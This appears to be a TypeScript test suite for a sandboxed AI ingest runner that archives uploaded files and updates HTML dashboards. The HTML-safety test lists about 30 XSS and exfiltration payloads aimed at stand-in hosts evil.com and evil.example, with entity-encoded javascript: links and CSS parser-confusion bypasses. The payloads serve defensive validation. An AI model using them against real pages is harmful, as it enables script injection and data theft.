import assert from "node:assert/strict";
import { mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, test } from "node:test";
import { BACKGROUND_MODEL } from "../src/assistant/background.ts";
import { listRuns, runningCount } from "../src/assistant/runs.ts";
import { initKbWorkspaceConfig } from "../src/ingest/contract.ts";
import { bindIngestRunner, runIngestBatchJob } from "../src/ingest/runner.ts";
import { createDropBatch, stageFileIntoBatch } from "../src/ingest/staging.ts";
import {
  createDropToken,
  resetDropAuthMemoryStateForTest,
  verifyDropPasscodeAndCreateSession,
  type DropTenantHost,
  type DropWorkspaceRef,
} from "../src/ingest/tokens.ts";
import {
  executeIngestMoveFile,
  executeIngestUpdateHtml,
  validateKbHtmlContentSafety,
  type IngestToolExecutionLog,
} from "../src/ingest/tools.ts";
import { extractWorkspaceOfficePreviewSync } from "../src/ingest/officePreview.ts";

const tempDirs: string[] = [];

function makeRunnerTestEnv() {
  const base = join(tmpdir(), `ingest-runner-test-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  const stateDir = join(base, "state");
  const workspaceRoot = join(base, "workspaces");
  const wsPath = join(workspaceRoot, "Fintopia集团");
  mkdirSync(stateDir, { recursive: true });
  mkdirSync(wsPath, { recursive: true });
  tempDirs.push(base);

  writeFileSync(join(wsPath, "归档说明.md"), "# 归档说明\n一级目录：资金、资产、牌照。\n", "utf8");
  mkdirSync(join(wsPath, ".jiebo"), { recursive: true });
  writeFileSync(join(wsPath, ".jiebo", "memory.md"), "# 工作区记忆\n原始记忆内容\n", "utf8");

  const initRes = initKbWorkspaceConfig(wsPath, {
    title: "Fintopia 集团知识库",
    allowedCategories: ["资金", "资产", "牌照"],
  });
  if (!initRes.ok) throw new Error(initRes.error);

  writeFileSync(
    join(wsPath, "资产", "资产.html"),
    "<!DOCTYPE html><html><head><title>资产总览</title></head><body><h1>原始资产看板</h1></body></html>",
    "utf8",
  );

  const registry = new Map<string, DropWorkspaceRef>();
  const wsRef: DropWorkspaceRef = {
    workspaceId: "wsa_11111111-2222-4333-8444-555555555555",
    key: "Fintopia集团",
    path: wsPath,
  };
  registry.set("Fintopia集团", wsRef);
  registry.set(wsRef.workspaceId, wsRef);

  const host: DropTenantHost = {
    id: "default",
    stateDir,
    workspaceRoot,
    resolveWorkspace: (keyOrId: string) => registry.get(keyOrId.trim()) ?? null,
  };

  createDropToken(host, {
    workspace: "Fintopia集团",
    passcode: "fintopia-2026",
  });
  const authRes = verifyDropPasscodeAndCreateSession(host, {
    passcode: "fintopia-2026",
    submitterName: "张工",
    clientIp: "10.0.0.1",
  });
  if (!authRes.ok) throw new Error("auth failed");

  const batchRes = createDropBatch(host, authRes.session);
  if (!batchRes.ok) throw new Error("batch failed");

  const staged = stageFileIntoBatch(host, authRes.session, {
    batchId: batchRes.batchId,
    fileName: "202611_洋钱罐风险预估.xlsx",
    data: Buffer.from("mock-xlsx-bytes"),
  });
  if (!staged.ok) throw new Error("stage failed");

  return {
    base,
    stateDir,
    workspaceRoot,
    wsPath,
    host,
    config: initRes.config,
    batchId: batchRes.batchId,
    stagedFile: staged.file,
    meta: staged.meta,
  };
}

afterEach(() => {
  bindIngestRunner(null);
  resetDropAuthMemoryStateForTest();
  while (tempDirs.length) {
    const dir = tempDirs.pop()!;
    rmSync(dir, { recursive: true, force: true });
  }
});

describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + runner.ts)", () => {
  test("ingest_move_file 硬围栏：严禁移动非本批次清单文件、严禁改后缀、严禁覆盖 归档说明.md / .jiebo/memory.md，用 linkSync 原子防覆盖", () => {
    const { wsPath, config, batchId, stagedFile } = makeRunnerTestEnv();
    const log: IngestToolExecutionLog = { movedFiles: [], updatedHtmls: [] };
    const allowedSet = new Set([stagedFile.relPath]);

    // 1. 尝试把工作区里的 归档说明.md 当作源文件移走 -> 拒绝
    assert.equal(
      executeIngestMoveFile(wsPath, config, batchId, "归档说明.md", "资产/归档说明_bak.md", allowedSet, log).ok,
      false,
    );

    // 2. 尝试移动不在本批登记清单中的同目录伪造文件 -> 拒绝
    const unrecordedRel = `.cursor-remote/uploads/inbox/${batchId}/unrecorded.xlsx`;
    writeFileSync(join(wsPath, unrecordedRel), "unrecorded");
    assert.equal(
      executeIngestMoveFile(wsPath, config, batchId, unrecordedRel, "资产/unrecorded.xlsx", allowedSet, log).ok,
      false,
    );

    // 3. 尝试移动时把 .xlsx 改名为 .html 或 .pdf -> 拒绝
    assert.equal(
      executeIngestMoveFile(wsPath, config, batchId, stagedFile.relPath, "资产/资产.html", allowedSet, log).ok,
      false,
    );
    assert.equal(
      executeIngestMoveFile(wsPath, config, batchId, stagedFile.relPath, "资产/洋钱罐/report.pdf", allowedSet, log).ok,
      false,
    );

    // 4. 尝试移入未授权分类目录 (00_待归档/) -> 拒绝
    assert.equal(
      executeIngestMoveFile(
        wsPath,
        config,
        batchId,
        stagedFile.relPath,
        "00_待归档/202611_洋钱罐风险预估.xlsx",
        allowedSet,
        log,
      ).ok,
      false,
    );

    // 5. 若目标位置已有一份历史同名档案，移动时通过 linkSync EEXIST 原子递增 _2，绝不覆盖已有文件
    mkdirSync(join(wsPath, "资产", "洋钱罐"), { recursive: true });
    const existingTarget = join(wsPath, "资产", "洋钱罐", "202611_洋钱罐风险预估.xlsx");
    writeFileSync(existingTarget, "old-history-file");

    const moveOk = executeIngestMoveFile(
      wsPath,
      config,
      batchId,
      stagedFile.relPath,
      "资产/洋钱罐/202611_洋钱罐风险预估.xlsx",
      allowedSet,
      log,
    );
    assert.equal(moveOk.ok, true);
    if (moveOk.ok) {
      assert.equal(moveOk.to, "资产/洋钱罐/202611_洋钱罐风险预估_2.xlsx");
      assert.equal(readFileSync(existingTarget, "utf8"), "old-history-file");
      assert.equal(readFileSync(join(wsPath, moveOk.to), "utf8"), "mock-xlsx-bytes");
    }
  });

  test("ingest_update_html 硬围栏：全面拦截内联/外链 <script>、on* 事件、实体编码/换行绕过的 javascript: 与外链 img，成功更新注入水位线", () => {
    const { wsPath, config } = makeRunnerTestEnv();

    const dangerousPayloads = [
      '<!DOCTYPE html><html><script src="https://evil.com/x.js"></script><body></body></html>',
      "<!DOCTYPE html><html><body><script>fetch('https://evil.com')</script></body></html>",
      "<!DOCTYPE html><html><body><script type=\"module\">import('https://evil.com/x.js')</script></body></html>",
      "<!DOCTYPE html><html><body><img src=x onerror=\"fetch('https://evil.com')\"></body></html>",
      '<!DOCTYPE html><html><body><a href="javascript&#58;alert(1)">x</a></body></html>',
      '<!DOCTYPE html><html><body><a href="java&#x73;cript:alert(1)">x</a></body></html>',
      '<!DOCTYPE html><html><body><a href="java\nscript:alert(1)">x</a></body></html>',
      '<!DOCTYPE html><html><body><button formaction="javascript:alert(1)">x</button></body></html>',
      '<!DOCTYPE html><html><head><meta http-equiv="&#114;efresh" content="0;url=https://evil.com"></head><body></body></html>',
      '<!DOCTYPE html><html><body><img src="https://evil.com/a.png?d=SECRET"></body></html>',
      '<!DOCTYPE html><html><body><iframe src="https://evil.com"></iframe></body></html>',
      '<!DOCTYPE html><html><head><style>@import "https://evil.example/a.css";</style></head><body></body></html>',
      "<!DOCTYPE html><html><head><style>@import '//evil.example/a.css';</style></head><body></body></html>",
      '<!DOCTYPE html><html><body style="background:url(&quot;https://evil.example/a.png&quot;)"></body></html>',
      '<!DOCTYPE html><html><body style="background:url(&apos;https://evil.example/a.png&apos;)"></body></html>',
      '<!DOCTYPE html><html><body style="background:url(\\68 ttps://evil.example/a.png)"></body></html>',
      '<!DOCTYPE html><html><body><a href="data:application/xhtml+xml,%3Cscript%3Ealert(1)%3C/script%3E">x</a></body></html>',
      '<!DOCTYPE html><html><body><img srcset="data:image/png;base64,AA 1x, https://evil.example/x.png 2x"></body></html>',
      "<!DOCTYPE html><html><body style=\"background-image:image-set('https://evil.example/a.png' 1x)\"></body></html>",
      "<!DOCTYPE html><html><body style=\"background-image:-webkit-image-set('https://evil.example/a.png' 1x)\"></body></html>",
      "<!DOCTYPE html><html><body style=\"background-image:image('https://evil.example/a.png')\"></body></html>",
      "<!DOCTYPE html><html><body><div title=\">\" style=\"background-image:image-set(')' 99x, 'https://evil.example/a.png' 1x)\"></div></body></html>",
      '<!DOCTYPE html><html><body><img src="https&colon&sol&sol;evil.example/a.png?d=SECRET"></body></html>',
      '<!DOCTYPE html><html><body><svg><image href="data:image/gif;base64,AAAA"><set attributeName="href" to="https://evil.example/a.png"/></image></svg></body></html>',
      `<!DOCTYPE html><html><head><style>body{background:image-set(/*${"a".repeat(5000)}*/"https://evil.example/a.png" 1x)}</style ></head><body></body></html>`,
      '<!DOCTYPE html><html><head><style>.a{content:"/*"}body{background:url("https://evil.example/a.png")}.b{content:"*/"}</style></head><body></body></html>',
      "<!DOCTYPE html><html><body><div style=\".a{content:'/*'}body{background:url('https://evil.example/a.png')}.b{content:'*/'}\"></div></body></html>",
      '<!DOCTYPE html><html><head><style>.x{a:</ style>}body{background:url("https://evil.example/a.png")}< style></style></head><body></body></html>',
      '<!DOCTYPE html><html><head><style>.x{a:</style=foo>}body{background:url("https://evil.example/a.png")}<style></style></head><body></body></html>',
      '<!DOCTYPE html><html><head><style title="></style>">body{background:url("https://evil.example/a.png")}</head><body></body></html>',
      '<!DOCTYPE html><html><head><style>body{background:url("ht\\\ntps:\\\n/\\\n/evil.example/a.png")}</style></head><body></body></html>',
    ];

    for (const payload of dangerousPayloads) {
      const check = validateKbHtmlContentSafety(payload);
      assert.equal(check.ok, false, `Payload should be blocked: ${payload}`);
    }

    // 拦截更新非同名 HTML 或尝试覆写 .jiebo/memory.md
    assert.equal(
      executeIngestUpdateHtml(wsPath, config, ".jiebo/memory.md", "<!DOCTYPE html><html><body>hack</body></html>").ok,
      false,
    );
    assert.equal(
      executeIngestUpdateHtml(wsPath, config, "资产/随便写的名字.html", "<!DOCTYPE html><html><body>hack</body></html>")
        .ok,
      false,
    );

    // 合法更新纯静态单文件内联 HTML
    const updateTop = executeIngestUpdateHtml(
      wsPath,
      config,
      "资产/资产.html",
      "<!DOCTYPE html><html><head><style>body{margin:0}</style></head><body><h1>更新后的资产看板</h1></body></html>",
      undefined,
      1793800000000,
    );
    assert.equal(updateTop.ok, true);
    const updatedContent = readFileSync(join(wsPath, "资产", "资产.html"), "utf8");
    assert.equal(updatedContent.startsWith("<!-- JIEBO_KB_META:"), true);
    assert.equal(updatedContent.includes("更新后的资产看板"), true);
    // 验证正文文本中同时包含 image() 说明与参考网址不会被误杀
    assert.equal(
      validateKbHtmlContentSafety(
        "<!DOCTYPE html><html><head><style>body{margin:0}</style></head><body><p>调用 url() 或 image() 绘制。文档见 https://example.com/docs</p></body></html>",
      ).ok,
      true,
    );

    // 验证 patches 局部增量替换模式：免整页重写即可更新现有大体积 HTML，且仍然拦截恶意补丁
    const patchOk = executeIngestUpdateHtml(
      wsPath,
      config,
      "资产/资产.html",
      undefined,
      undefined,
      1793800001000,
      [{ oldText: "<h1>更新后的资产看板</h1>", newText: "<h1>增量补丁更新后的资产看板</h1><p>新增9月月报</p>" }],
    );
    assert.equal(patchOk.ok, true);
    if (patchOk.ok) {
      assert.equal(patchOk.mode, "patch");
    }
    const patchedContent = readFileSync(join(wsPath, "资产", "资产.html"), "utf8");
    assert.equal(patchedContent.includes("增量补丁更新后的资产看板"), true);

    // 若补丁试图注入 <script>，必须被拦截且原 HTML 保持不变
    const badPatch = executeIngestUpdateHtml(wsPath, config, "资产/资产.html", undefined, undefined, 1793800002000, [
      { oldText: "<p>新增9月月报</p>", newText: "<script>alert(1)</script>" },
    ]);
    assert.equal(badPatch.ok, false);
    assert.equal(readFileSync(join(wsPath, "资产", "资产.html"), "utf8").includes("<script>"), false);
  });

  test("runIngestBatchJob 完整调度：正确读取 result.result、闭合 runRecord、按租户遵循沙箱配置（默认启用），且超时后锁死写工具防止残留并发写盘", async () => {
    const { wsPath, host, meta, stagedFile } = makeRunnerTestEnv();

    let capturedTools: string[] = [];
    let capturedSandbox: boolean | undefined;
    let callbackSummary = "";

    bindIngestRunner({
      apiKey: () => "test-api-key",
      listModels: async () => [BACKGROUND_MODEL],
      prompt: async (_message, options) => {
        capturedTools = [...(options.tools ?? [])];
        capturedSandbox = options.local?.sandboxOptions?.enabled;
        const custom = options.local?.customTools ?? {};

        const infoRes = await custom.ingest_batch_info.execute({}, { toolCallId: "c1" });
        assert.equal(typeof infoRes === "string" && infoRes.includes(meta.batchId), true);

        const moveRes = await custom.ingest_move_file.execute(
          {
            fromRelPath: stagedFile.relPath,
            toRelPath: "资产/洋钱罐（锋泰、瓴岳）/202611_洋钱罐风险预估.xlsx",
          },
          { toolCallId: "c2" },
        );
        assert.equal(typeof moveRes === "string" && moveRes.includes('"ok":true'), true);

        const htmlRes = await custom.ingest_update_html.execute(
          {
            htmlRelPath: "资产/资产.html",
            htmlContent: "<!DOCTYPE html><html><body><h1>已合入202611洋钱罐风险预估</h1></body></html>",
          },
          { toolCallId: "c3" },
        );
        assert.equal(typeof htmlRes === "string" && htmlRes.includes('"ok":true'), true);

        return {
          id: "run_1",
          status: "finished",
          result: "已完成洋钱罐 11 月风险预估表归档，并更新 @资产/资产.html 看板。",
          messages: [],
        };
      },
      onBatchCompleted: async (res) => {
        callbackSummary = res.summaryText;
      },
    });

    const jobResult = await runIngestBatchJob({
      host,
      entry: {
        batchId: meta.batchId,
        tenantId: host.id,
        workspaceId: meta.workspaceId,
        workspaceKeySnapshot: meta.workspaceKey,
        submitterName: meta.submitterName,
        note: "11月风险预估",
        status: "processing",
        attempts: 1,
        queuedAt: Date.now(),
      },
      workspacePath: wsPath,
      meta,
    });

    assert.equal(jobResult.status, "completed");
    assert.equal(capturedSandbox, true);
    assert.deepEqual(capturedTools, ["read", "grep", "glob", "ls", "mcp"]);
    assert.equal(callbackSummary, "已完成洋钱罐 11 月风险预估表归档，并更新 @资产/资产.html 看板。");

    // 验证运行记录已正常闭合为 done（runningCount === 0）
    assert.equal(runningCount(host), 0);
    const runs = listRuns(host, 5);
    assert.equal(runs[0]?.status, "done");
    assert.equal(runs[0]?.summary?.includes("已完成洋钱罐"), true);

    // 验证 .jiebo/memory.md 完好无损未被污染
    assert.equal(readFileSync(join(wsPath, ".jiebo", "memory.md"), "utf8"), "# 工作区记忆\n原始记忆内容\n");

    // 验证超时后 customTools 被立即锁死，迟到的工具调用返回 isError: true
    let lateToolRef: {
      execute: (
        args: Record<string, unknown>,
        ctx: { toolCallId: string },
      ) => Promise<string | { content: string; isError?: boolean }>;
    } | null = null;
    bindIngestRunner({
      apiKey: () => "test-api-key",
      listModels: async () => [BACKGROUND_MODEL],
      prompt: async (_m, options) => {
        lateToolRef = (options.local?.customTools?.ingest_update_html ?? null) as typeof lateToolRef;
        await new Promise((r) => setTimeout(r, 120));
        return { id: "run_2", status: "finished", result: "late", messages: [] };
      },
    });

    const timeoutRes = await runIngestBatchJob(
      {
        host,
        entry: {
          batchId: meta.batchId,
          tenantId: host.id,
          workspaceId: meta.workspaceId,
          workspaceKeySnapshot: meta.workspaceKey,
          submitterName: meta.submitterName,
          note: "超时测试",
          status: "processing",
          attempts: 1,
          queuedAt: Date.now(),
        },
        workspacePath: wsPath,
        meta,
      },
      { timeoutMs: 25 },
    );
    assert.equal(timeoutRes.status, "failed");
    assert.equal(runningCount(host), 0);
    assert.equal(Boolean(lateToolRef), true);
    const lateCallOut = await lateToolRef!.execute(
      {
        htmlRelPath: "资产/资产.html",
        htmlContent: "<!DOCTYPE html><html><body>late write</body></html>",
      },
      { toolCallId: "late1" },
    );
    assert.equal(typeof lateCallOut === "object" && lateCallOut.isError === true, true);
  });

  test("officePreview 与超时收尾保护：支持免 Read 提取真实 .xlsx 单元格预览，且当全部文件已移入归档并已更新至少一个 HTML 时超时不误标为 partial", async () => {
    const { wsPath, host } = makeRunnerTestEnv();

    // 构造一个最小合法的 Stored (method=0) ZIP 格式 .xlsx Buffer
    function makeStoredZip(files: Array<{ name: string; content: string }>): Buffer {
      const localParts: Buffer[] = [];
      const cdParts: Buffer[] = [];
      let offset = 0;
      for (const f of files) {
        const nameBuf = Buffer.from(f.name, "utf8");
        const dataBuf = Buffer.from(f.content, "utf8");
        const lh = Buffer.alloc(30);
        lh.writeUInt32LE(0x04034b50, 0);
        lh.writeUInt16LE(20, 4);
        lh.writeUInt16LE(0, 6);
        lh.writeUInt16LE(0, 8);
        lh.writeUInt32LE(0, 10);
        lh.writeUInt32LE(0, 14);
        lh.writeUInt32LE(dataBuf.length, 18);
        lh.writeUInt32LE(dataBuf.length, 22);
        lh.writeUInt16LE(nameBuf.length, 26);
        lh.writeUInt16LE(0, 28);
        localParts.push(lh, nameBuf, dataBuf);

        const cd = Buffer.alloc(46);
        cd.writeUInt32LE(0x02014b50, 0);
        cd.writeUInt16LE(20, 4);
        cd.writeUInt16LE(20, 6);
        cd.writeUInt16LE(0, 8);
        cd.writeUInt16LE(0, 10);
        cd.writeUInt32LE(0, 12);
        cd.writeUInt32LE(0, 16);
        cd.writeUInt32LE(dataBuf.length, 20);
        cd.writeUInt32LE(dataBuf.length, 24);
        cd.writeUInt16LE(nameBuf.length, 28);
        cd.writeUInt16LE(0, 30);
        cd.writeUInt16LE(0, 32);
        cd.writeUInt16LE(0, 34);
        cd.writeUInt16LE(0, 36);
        cd.writeUInt32LE(0, 38);
        cd.writeUInt32LE(offset, 42);
        cdParts.push(cd, nameBuf);

        offset += 30 + nameBuf.length + dataBuf.length;
      }
      const cdBuf = Buffer.concat(cdParts);
      const eocd = Buffer.alloc(22);
      eocd.writeUInt32LE(0x06054b50, 0);
      eocd.writeUInt16LE(0, 4);
      eocd.writeUInt16LE(0, 6);
      eocd.writeUInt16LE(files.length, 8);
      eocd.writeUInt16LE(files.length, 10);
      eocd.writeUInt32LE(cdBuf.length, 12);
      eocd.writeUInt32LE(offset, 16);
      eocd.writeUInt16LE(0, 20);
      return Buffer.concat([...localParts, cdBuf, eocd]);
    }

    const xlsxBuf = makeStoredZip([
      {
        name: "xl/sharedStrings.xml",
        content:
          '<?xml version="1.0" encoding="UTF-8"?><sst><si><t>黑龙江三农信融资担保有限公司</t></si><si><t>月末在保余额</t></si></sst>',
      },
      {
        name: "xl/workbook.xml",
        content: '<?xml version="1.0" encoding="UTF-8"?><workbook><sheets><sheet name="9月快报" r:id="rId1"/></sheets></workbook>',
      },
      {
        name: "xl/worksheets/sheet1.xml",
        content:
          '<?xml version="1.0" encoding="UTF-8"?><worksheet><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c><c r="C1"><v>608657</v></c></row></sheetData></worksheet>',
      },
    ]);

    const authRes = verifyDropPasscodeAndCreateSession(host, {
      passcode: "fintopia-2026",
      submitterName: "tuyanyan",
      clientIp: "10.0.0.2",
    });
    assert.equal(authRes.ok, true);
    if (!authRes.ok) return;
    const batchRes = createDropBatch(host, authRes.session);
    assert.equal(batchRes.ok, true);
    if (!batchRes.ok) return;
    const staged = stageFileIntoBatch(host, authRes.session, {
      batchId: batchRes.batchId,
      fileName: "基础数据快报.xlsx",
      data: xlsxBuf,
    });
    assert.equal(staged.ok, true);
    if (!staged.ok) return;

    const preview = extractWorkspaceOfficePreviewSync(wsPath, staged.file.relPath);
    assert.equal(preview?.ok, true);
    assert.equal(preview?.text.includes("黑龙江三农信融资担保有限公司"), true);
    assert.equal(preview?.text.includes("608657"), true);

    // 验证当模型已完成所有文件移动并更新了主体 HTML，但在最后收尾时超时，批次状态记为 completed 而非 partial
    bindIngestRunner({
      apiKey: () => "test-api-key",
      listModels: async () => [BACKGROUND_MODEL],
      prompt: async (_m, options) => {
        const custom = options.local?.customTools ?? {};
        const infoRaw = await custom.ingest_batch_info.execute({}, { toolCallId: "info1" });
        assert.equal(typeof infoRaw === "string" && infoRaw.includes("608657"), true);
        await custom.ingest_move_file.execute(
          {
            fromRelPath: staged.file.relPath,
            toRelPath: "牌照/黑龙江三农信融资担保/基础数据快报.xlsx",
          },
          { toolCallId: "mv1" },
        );
        await custom.ingest_update_html.execute(
          {
            htmlRelPath: "资产/资产.html",
            patches: [{ oldText: "<h1>原始资产看板</h1>", newText: "<h1>已更新9月快报 608657 万元</h1>" }],
          },
          { toolCallId: "up1" },
        );
        await new Promise((r) => setTimeout(r, 120));
        return { id: "run_late_finish", status: "finished", result: "done", messages: [] };
      },
    });

    const res = await runIngestBatchJob(
      {
        host,
        entry: {
          batchId: staged.meta.batchId,
          tenantId: host.id,
          workspaceId: staged.meta.workspaceId,
          workspaceKeySnapshot: staged.meta.workspaceKey,
          submitterName: staged.meta.submitterName,
          note: "9月月报",
          status: "processing",
          attempts: 1,
          queuedAt: Date.now(),
        },
        workspacePath: wsPath,
        meta: staged.meta,
      },
      { timeoutMs: 30 },
    );
    assert.equal(res.status, "completed");
    assert.equal(res.errorReason, undefined);
  });
});
